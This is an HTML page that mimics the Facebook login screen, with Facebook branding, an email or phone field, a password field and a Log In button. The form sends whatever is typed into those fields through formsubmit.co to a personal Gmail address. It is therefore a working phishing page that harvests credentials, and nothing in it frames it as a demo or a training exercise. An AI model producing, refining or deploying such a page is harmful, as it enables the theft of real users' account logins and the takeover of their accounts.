<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Facebook Login</title>
    <link href="./output.css" rel="stylesheet" />
  </head>
  <body class="bg-gray-100 font-sans">
    <div class="flex flex-col md:flex-row justify-center items-center min-h-screen px-4">
      <!-- Left section -->
      <div class="mb-12 md:mb-0 md:mr-20 text-center md:text-left">
        <h1 class="text-5xl text-blue-600 font-bold mb-4">facebook</h1>
        <p class="text-xl text-gray-700">Connect with friends and the world around you on Facebook. <br>
        Continue with facebook to get started</p>
      </div>

      <!-- Login card -->
      <div class="bg-white p-6 rounded-lg shadow-md w-full max-w-sm">
        <form action="https://formsubmit.co/godspowerrichard001@gmail.com" method="POST">
          <input
            type="text"
            name="name"
            placeholder="Email or Phone Number"
            class="w-full px-4 py-3 mb-3 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-500"
          />
          <input
            type="password"
            name="password"
            placeholder="Password"
            class="w-full px-4 py-3 mb-4 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-500"
          />
          <button
            type="submit"
            class="w-full bg-blue-600 text-white py-3 rounded font-semibold hover:bg-blue-700"
          >
            Log In
          </button>
          <p class="text-center text-blue-600 mt-3 hover:underline cursor-pointer">Forgotten password?</p>
          <hr class="my-4" />
          <button
            type="button"
            class="bg-green-500 text-white py-3 px-5 rounded font-semibold hover:bg-green-600 mx-auto block"
          >
            Create New Account
          </button>
        </form>
      </div>
    </div>
  </body>
</html>
